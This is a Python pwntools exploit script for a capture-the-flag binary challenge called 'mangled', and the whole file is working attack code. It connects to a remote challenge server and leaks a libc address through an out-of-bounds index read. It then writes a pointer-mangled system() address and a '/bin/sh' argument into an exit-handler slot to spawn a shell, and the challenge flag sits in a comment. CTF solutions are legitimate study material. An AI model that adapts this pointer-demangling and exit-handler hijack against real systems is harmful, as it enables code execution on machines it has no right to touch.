#!/usr/bin/python3
import time
from pwn import *
#flag{l34rn_t0_d3f347_P7R_D3M4N6l3}
#p = process("./mangled_patched")
p = remote("0.cloud.chals.io", 12255)
elf = ELF("./mangled_patched", checksec = 0)
libc = elf.libc

#gdb.attach(p, gdbscript = """
#       b edit_exit_func
#    """)
c = lambda a : p.sendlineafter(b"> ", str(a))
s = lambda a: p.send(a)
sl = lambda a: p.sendline(a)
sa = lambda a, b: p.sendafter(a, b)
sla = lambda a, b: p.sendlineafter(a, b)
ru = lambda a: p.recvuntil(a)
d = lambda : gdb.attach(p)

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

def encrypt(v, key):
    return p64(rol(v ^ key, 0x11, 64))


ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

def create(idx, data):
    c(1)
    sla(b"Index: ", str(idx))
    sla(b"data: ", data)

def read(idx):
    c(2)
    sla(b"Index: ", str(idx))

def delete(idx):
    c(3)
    sla(b"Index: ", str(idx))
def bug(data):
    c(1337)
    sa(b"value: ", data)

def exploit():
    create(0, b"A" * 0x8)
    read(314652)
    libc.address = u64(p.recvline().strip(b"\n").ljust(8, b"\x00")) - 0x216820
    log.info(f"libc @ {hex(libc.address)}")
    create(40172, b"A" * 0x8)
    delete(40172)
    payload = encrypt(libc.sym.system, 0) + p64(next(libc.search(b"/bin/sh\x00")))
    bug(payload)
    #d()
    c(4)
    p.interactive()

exploit()
